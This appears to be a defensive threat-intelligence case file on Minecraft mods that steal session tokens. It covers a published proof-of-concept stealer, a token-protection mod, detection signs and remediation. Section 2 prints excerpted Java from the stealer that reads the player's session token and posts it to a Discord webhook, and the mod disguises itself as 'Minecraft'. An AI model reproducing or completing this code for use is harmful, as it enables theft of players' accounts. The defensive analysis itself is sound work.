# Case 014 — Minecraft session-stealer mod PoCs / kits (OSINT)

- **Verdict:** **proof-of-concept / tooling** — not a single campaign, but a class of code that
  demonstrates and enables the exact attack used by Cluster A and Weedhack
- **Handling:** OSINT only. **No sample was downloaded or executed.**
- **Date:** 2026-11-18
- **Analyst:** OpenHands (open-source intelligence)
- **Primary sources:**
  - `shurp3/MC-Session-Stealer` — https://github.com/shurp3/MC-Session-Stealer
  - `cev-api/Token-Protector` (defensive counterpart) — https://github.com/cev-api/Token-Protector

---

## 1. Purpose of this case

This case documents the **canonical attack primitive** behind the DonutSMP campaign (and every
"Minecraft stealer mod"): reading the live `Session` object from inside a mod and posting it out.
We read the published PoC source directly (below), so the *mechanism* is confirmed even though we
did not run it.

## 2. The primitive (verbatim from the PoC)

`shurp3/MC-Session-Stealer` is a Forge mod whose entire purpose is to POST the victim's session
token to a Discord webhook. The relevant code (`com.github.shurpe.Main`):

```java
// some random mod info to suppress warnings in logs
@Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
public final class Main {
    private static final String WEBHOOK_URL = "";       // attacker's Discord webhook
    private static final boolean PING_EVERYONE = true;
    private static final Minecraft mc = Minecraft.getMinecraft();
    ...
    private DiscordWebhook.EmbedObject genAccInfoEmbed() {
        final Session session = mc.getSession();
        return new DiscordWebhook.EmbedObject()
            .setTitle(":unlock: Account Info")
            ...
            .addField(":identification_card: Name", "```" + session.getUsername() + "```", true)
            .addField(":identification_card: UUID", "```" + session.getPlayerID() + "```", true)
            .addField(":key: Session Token",   "```" + session.getToken()   + "```", false);
    }
}
```

It also exfiltrates the saved-server list and geo-locates the victim via `https://ipapi.co/json`.

**Key takeaways for defenders:**

1. The theft needs **only** `Minecraft.getMinecraft().getSession()` → `Session.getToken()`.
2. The mod disguises itself as `modid = "Minecraft", name = "Minecraft"` to look benign in logs.
3. Exfiltration is a plain **Discord webhook POST** — identical to the Cluster-A modules.

This is the same `Session`/`class_320`/`field_1726` accessor pattern we observed in the
Cluster-A JARs. The PoC proves the primitive is trivial and well-known.

## 3. The defensive counterpart (TokenProtector)

`cev-api/Token-Protector` exists precisely because this primitive is easy to abuse. It is a
client-side Fabric mod for 1.21.x that **sanitises the access token** so other mods cannot read it.
Protected paths (as documented) include:

- `User.getAccessToken()` / `User.getSessionId()` and direct field reads;
- reflective / `Unsafe` / `VarHandle` / `MethodHandle` reads of `User` and authlib fields;
- `MinecraftClient.accessToken` (masked at rest);
- `FabricLoader.getLaunchArguments(...)` (token replaced/omitted before `Main.main` runs);
- `HttpURLConnection` auth-header probes.

The existence of this defensive mod is itself evidence of how widespread the session-stealer
primitive is.

## 4. Why "just a client" is not a safety argument

The Cluster-A samples bundle (a) a working-looking client and (b) the loader/stealer machinery.
A session stealer like the PoC above is ~100 lines. An attacker can hide it inside any "free
client" and the victim sees only a normal-looking mod. This is exactly the Cluster-A design.

## 5. Detection

- Any mod that reads `MinecraftClient`/`Minecraft` `Session`/`User` token fields and then performs
  an HTTP POST to `discord.com/api/webhooks/...`, a paste service, or an unknown host.
- Obfuscated `String[]`/`invokedynamic` string tables (Cluster A) or class-keyed `.bin` tables.
- `Class.forName` + `MethodHandles`/reflection targeting `Session`/`User`.

## 6. Remediation

- Invalidate the Minecraft session (log out everywhere / launcher account) and change the
  Microsoft password; stolen tokens survive until invalidated.
- Remove untrusted mods/clients; prefer TokenProtector-style hardening where available.
- Never run "free" clients from unofficial sites.

## 7. Caveats

- PoC repo is educational; it contains **no** real C2 (the webhook is blank).
- Detail is from public sources; not independently re-verified.
